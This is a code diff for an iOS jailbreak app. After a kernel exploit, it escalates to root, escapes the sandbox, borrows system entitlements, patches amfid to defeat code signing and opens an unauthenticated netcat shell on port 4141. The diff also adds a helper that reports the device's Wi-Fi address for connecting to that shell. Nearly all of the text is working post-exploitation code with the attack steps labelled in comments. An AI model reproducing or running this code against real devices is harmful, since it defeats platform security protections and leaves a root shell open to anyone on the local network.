@@ -12,10 +12,14 @@
 #include "jelbrek/kern_utils.h"
 #include "jelbrek/offsetof.h"
 #include "jelbrek/patchfinder64.h"
+#include "jelbrek/shell.h"
 
 #include <sys/stat.h>
 #include <sys/spawn.h>
 #include <mach/mach.h>
+
+#include <ifaddrs.h>
+#include <arpa/inet.h>
 
 mach_port_t taskforpidzero;
 uint64_t kernel_base, kslide;
@@ -79,15 +83,47 @@ next:
 
 @implementation ViewController
 
+//https://stackoverflow.com/questions/6807788/how-to-get-ip-address-of-iphone-programmatically
+- (NSString *)getIPAddress {
+    
+    NSString *address = @"error";
+    struct ifaddrs *interfaces = NULL;
+    struct ifaddrs *temp_addr = NULL;
+    int success = 0;
+    // retrieve the current interfaces - returns 0 on success
+    success = getifaddrs(&interfaces);
+    if (success == 0) {
+        // Loop through linked list of interfaces
+        temp_addr = interfaces;
+        while(temp_addr != NULL) {
+            if(temp_addr->ifa_addr->sa_family == AF_INET) {
+                // Check if interface is en0 which is the wifi connection on the iPhone
+                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
+                    // Get NSString from C String
+                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
+                    
+                }
+                
+            }
+            
+            temp_addr = temp_addr->ifa_next;
+        }
+    }
+    // Free memory
+    freeifaddrs(interfaces);
+    return address;
+    
+}
+
 -(void)log:(NSString*)log {
-    self.logs.text = [NSString stringWithFormat:@"%@\n%@", self.logs.text, log];
+    self.logs.text = [NSString stringWithFormat:@"%@%@\n", self.logs.text, log];
 }
 
 -(void)jelbrek {
-    get_root(getpid());
-    empower(getpid());
-    unsandbox(getpid());
     
+    get_root(getpid()); //setuid(0)
+    empower(getpid()); //csflags
+    unsandbox(getpid());
     
     if (geteuid() == 0) {
         
@@ -99,7 +135,7 @@ next:
             return;
         }
         else
-            [self log:[NSString stringWithFormat:@"Successfully wrote file! %p", f]];
+            [self log:[NSString stringWithFormat:@"Successfully got out of sandbox! Wrote file! %p", f]];
         fclose(f);
         
     }
@@ -108,22 +144,36 @@ next:
         return;
     }
     
-    //Jonathan Levin: http://newosxbook.com/QiLin/
-    initQiLin(taskforpidzero, kernel_base);
     
     setKernelSymbol("_kernproc", find_kernproc()-kslide);
-    
     platformizeMe();
-    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL);
-    castrateAmfid();
+    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL); //allow us to get amfid's task
+    pid_t pid = pid_for_name("sysdiagnose");
+    kill(pid, SIGSTOP);
+    kill(pid, SIGSTOP);
     
-    NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]];
-    chmod([testbin UTF8String], 777);
+    castrateAmfid(); //patch amfid
+
+    NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]]; //test binary
+    chmod([testbin UTF8String], 777); //give it proper permissions
     
     pid_t pd;
-    const char* args[] = {[testbin UTF8String], NULL};
+    const char* args[] = {[testbin UTF8String],  NULL};
     int rv = posix_spawn(&pd, [testbin UTF8String], NULL, NULL, (char **)&args, NULL);
+
     [self log:(rv) ? @"Failed to patch codesign!" : @"SUCCESS! Patched codesign!"];
+    
+    [self log:[NSString stringWithFormat:@"Shell should be up and running\nconnect with netcat: nc %@ 4141", [self getIPAddress]]];
+    
+    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
+        if (!rv)
+            drop_payload(); //chmod 777 all binaries and spawn a shell
+    });
+    
+    //to connect use netcat:
+    //nc 192.168.XX.XX 4141
+    //replace your IP in there
+    
 }
 - (IBAction)go:(id)sender {
     taskforpidzero = run();
@@ -131,7 +181,7 @@ next:
     kslide = kernel_base - 0xfffffff007004000;
     
     if (taskforpidzero != MACH_PORT_NULL) {
-        [self log:@"Exploit successful!"];
+        [self log:@"Exploit success!"];
         init_jelbrek(taskforpidzero, kernel_base);
         [self jelbrek];
     }
